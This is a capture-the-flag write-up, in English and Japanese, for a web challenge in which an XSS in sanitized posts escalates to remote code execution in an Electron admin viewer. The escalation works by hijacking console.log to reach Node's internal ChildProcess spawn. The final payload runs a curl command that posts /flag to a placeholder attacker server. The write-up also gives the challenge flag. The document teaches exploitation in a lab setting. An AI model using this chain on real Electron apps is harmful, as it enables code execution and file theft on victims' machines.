---
title: elec
level: 4
flag: FLAG{r3m07e_c0d3_execu710n_v1a_3l3c7r0n}
writer: ciffelia
---

# elec

> https://web-elec-lz56g6.wanictf.org/

## Solution

日本語版は英語版の後に記載しています。Japansese follows English.

In this challenge, user posts are sanitized using [sanitize-html](https://github.com/apostrophecms/sanitize-html) as follows:

```js
sanitizeHtml(userPost, {allowedTags: ["p", "br", "hr", "a", "img", "blockquote", "ul", "ol", "li"],allowedAttributes: {'*':['*']}})
```

This sanitization prevents the use of `<script>` elements in posts. However, since any HTML attribute is allowed, XSS is possible, for instance:

```html
<img src=x onerror="alert(1)">
```

In this challenge, the flag is not in the admin's cookie but on the filesystem. Therefore, XSS alone isn't enough to obtain the flag; we need to achieve Remote Code Execution (RCE).

Notably, the admin uses Electron to view posts, and the following options are specified when Electron starts:

```js
const win = new BrowserWindow({
  width: 800,
  height: 600,
  webPreferences: {
    preload: path.join(__dirname, "preload.js"),
    contextIsolation: false,
    sandbox: false,
  },
});
```

Explaining the main process, renderer process, and preload script of Electron is omitted here. If you're unfamiliar, refer to the following articles for a clear explanation:

- [Process Model | Electron](https://www.electronjs.org/docs/latest/tutorial/process-model)

Specifying `sandbox: false` allows the use of Node.js APIs in the preload script. In this challenge, the preload script uses the `child_process` module, so this option is necessary.

Specifying `contextIsolation: false` makes the preload script and website scripts run in the same context. This allows an attacker to interfere with `preload.js` via XSS code, enabling actions like prototype pollution or overwriting functions like `console.log`.

The `preload.js` contains the following code:

```js
const cp = spawn("uname", ["-a"]);
console.log(cp);
```

[`spawn`](https://nodejs.org/docs/latest-v20.x/api/child_process.html#child_processspawncommand-args-options) is a function imported from Node.js's [`child_process`](https://nodejs.org/docs/latest-v20.x/api/child_process.html) module, returning an instance of [`ChildProcess`](https://nodejs.org/docs/latest-v20.x/api/child_process.html#class-childprocess). By overwriting `console.log` in the XSS code, we can access this `ChildProcess` instance.

What can we do with the `ChildProcess` instance? The Node.js documentation suggests we can't start new processes. However, reading Node.js's source code reveals an internal API for starting processes:

https://github.com/nodejs/node/blob/b965dddf69080fe9cfe1372d12d2da59a98d6a21/lib/internal/child_process.js#L355

Though undocumented, by examining how the spawn function calls this internal API, we find that we can execute arbitrary commands like this:

```js
const ChildProcess = cp.constructor
new ChildProcess().spawn({ file: 'echo', args: ['echo', 'hello', 'world!'] })
```

Thus, we can create a post like this and report it to obtain the flag:

```html
<img src=x onerror="console.log = (x) => { if (x.constructor.name === 'ChildProcess') new x.constructor().spawn({ file: 'sh', args: ['sh', '-c', 'curl -X POST -d @/flag https://your-server.example'] }) }">
```

This challenge is inspired by the Microsoft Teams RCE discovered at last year's Pwn2Own.

[How I Hacked Microsoft Teams and got $150,000 in Pwn2Own - Speaker Deck](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)

## 解法

本問ではユーザーの投稿内容が以下のように[sanitize-html](https://github.com/apostrophecms/sanitize-html)によりサニタイズされています。

```js
sanitizeHtml(userPost, {allowedTags: ["p", "br", "hr", "a", "img", "blockquote", "ul", "ol", "li"],allowedAttributes: {'*':['*']}})
```

この処理により、投稿で`<script>`要素を使用することはできなくなっています。しかし、HTMLの属性は任意のものが利用可能な設定になっているため、以下のようにXSSが可能です。

```html
<img src=x onerror="alert(1)">
```

一方で、本問ではフラグはadminのCookieではなくファイルシステム上に存在しています。そのため、XSSだけではフラグを取得できず、RCEを実現する必要があります。

ここで注目するのが、本問ではadminが投稿の閲覧にElectronを使用していることと、Electronの起動時に以下のオプションが指定されていることです。

```js
const win = new BrowserWindow({
  width: 800,
  height: 600,
  webPreferences: {
    preload: path.join(__dirname, "preload.js"),
    contextIsolation: false,
    sandbox: false,
  },
});
```

Electronにおけるメインプロセスとレンダラープロセス、プリロードスクリプトに関する説明は割愛します。以下の記事などでわかりやすく解説されているため、ご存知でない方はご確認ください。

- [Electron - チュートリアルその5 プリロードスクリプトの使い方 - pystyle](https://pystyle.info/electron-tutorial-use-preload-script/)
- [Electron入門 ~ Webの技術でつくるデスクトップアプリ](https://zenn.dev/sprout2000/books/6f6a0bf2fd301c)
- [プロセスモデル | Electron](https://www.electronjs.org/ja/docs/latest/tutorial/process-model)

`sandbox: false`を指定すると、プリロードスクリプトからNode.js APIの利用が可能になります。本問のプリロードスクリプトでは`child_process`モジュールを利用しているため、このオプションの指定が必要です。

`contextIsolation: false`を指定すると、プリロードスクリプトとウェブサイトのスクリプトが同じコンテクストで実行されるようになります。本問では、攻撃者がXSSのコードから`preload.js`に干渉することができるようになります。Prototype Pollutionを行うことや`console.log`などの関数を書き換えることが可能です。

`preload.js`には以下の処理があります。

```js
const cp = spawn("uname", ["-a"]);
console.log(cp);
```

[`spawn`](https://nodejs.org/docs/latest-v20.x/api/child_process.html#child_processspawncommand-args-options)はNode.jsの[`child_process`](https://nodejs.org/docs/latest-v20.x/api/child_process.html)モジュールからインポートした関数で、[`ChildProcess`](https://nodejs.org/docs/latest-v20.x/api/child_process.html#class-childprocess)のインスタンスを返します。XSSのコードで`console.log`を書き換えれば、この`ChildProcess`のインスタンスにアクセスすることができそうです。

では、この`ChildProcess`のインスタンスを利用して何ができるのでしょうか？Node.jsのドキュメントを読む限りでは新たにプロセスを起動することはできないように見えます。しかしNode.jsのソースコードを読むと、プロセスを起動するための内部APIが存在することがわかります。

https://github.com/nodejs/node/blob/b965dddf69080fe9cfe1372d12d2da59a98d6a21/lib/internal/child_process.js#L355

この関数の使い方はドキュメントに記載されていませんが、`spawn`関数を実行する際の内部APIの呼び出しなどを調べることで、以下のように任意のコマンドを実行できることがわかります。

```js
const ChildProcess = cp.constructor
new ChildProcess().spawn({ file: 'echo', args: ['echo', 'hello', 'world!'] })
```

したがって、本文が次のような投稿を作成しReportすることでフラグを取得できます。

```html
<img src=x onerror="console.log = (x) => { if (x.constructor.name === 'ChildProcess') new x.constructor().spawn({ file: 'sh', args: ['sh', '-c', 'curl -X POST -d @/flag https://your-server.example'] }) }">
```

本問は、昨年のPwn2Ownで発見されたMicrosoft TeamsのRCEを元ネタにしています。

[Pwn2OwnでMicrosoft Teamsをハッキングして2000万円を獲得した方法/ Shibuya.XSS techtalk #12 - Speaker Deck](https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-12)
